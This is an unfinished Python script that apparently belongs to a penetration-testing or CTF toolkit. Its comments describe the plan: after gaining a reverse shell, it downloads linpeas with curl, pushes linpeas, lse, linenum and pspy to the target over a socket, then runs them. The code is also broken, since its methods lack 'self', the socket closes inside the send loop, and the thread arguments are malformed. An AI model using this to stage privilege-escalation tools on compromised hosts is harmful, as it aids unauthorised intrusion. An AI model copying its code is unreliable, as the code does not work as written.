# Shit on Crackers
# I should write a bunch of modules (functions) 

# File transfer
# I will be downloading the script after I got a rev shell
# Ask user to go to /tmp or maybe I can download shit in /tmp without the user being there.
# I want to download linpeas, run it and save the output in a file

# https://www.thepythoncode.com/article/send-receive-files-using-sockets-python  
import socket
import os
import logging
import threading
import time
from io import BytesIO

class TransferFiles:
    filesnames = []

  # Initialize the file names we want to download
    def __init__(self, filesnames):
        self.filesnames = ["linpeas","lse","linenum","pspy"]

  # Get the latest version of the files
    def get_required_files():
        # Get the latest version of Linpeas
        os.system("curl -o linpeas.sh -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh")


    # Maybe I should check if the file already exists first and then download it
    # If it exists I will just `return` 
    # To make sure that the file's name is proper we can rename it after downloading it just to be sure ( Check how to do that exactly )

    # The logic to transfer one file
    def one_file_transfer(filename):

        SEPARATOR = "<SEPARATOR>"
        BUFFER_SIZE = 4096
        host = "127.0.0.1" # Should be entered by the user (Fix that later)
        port = 9999

        # Maybe I can include the files in the git repository

        filesize = os.path.getsize(filename)

        s = socket.socket()

        # Put an error message for everything (E.g. when connection fails)

        print(f"[+] Connecting to {host}:{port}")
        s.connect((host, port))
        print("[+] Connected.")

        s.send(f"{filename}{SEPARATOR}{filesize}".encode())  

        #   progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)

        with open(filename, "rb") as f:
            while True:
                bytes_read = f.read(BUFFER_SIZE)
                if not bytes_read:
                # file transmitting is done
                    break
                # sendall is a function that sends all of the buffer I provide it with or passes an exception
                s.sendall(bytes_read)
                # update the progress bar
                # progress.update(len(bytes_read))
                # close the socket
                s.close()

    # The whole transfer of all the files (Threaded)
    def transfer_files(self):
        for i in range(len(self.filesnames)):
            file_thread = threading.Thread(target=self.one_file_transfer, args=(self.filesnames[i]))
            file_thread.start()
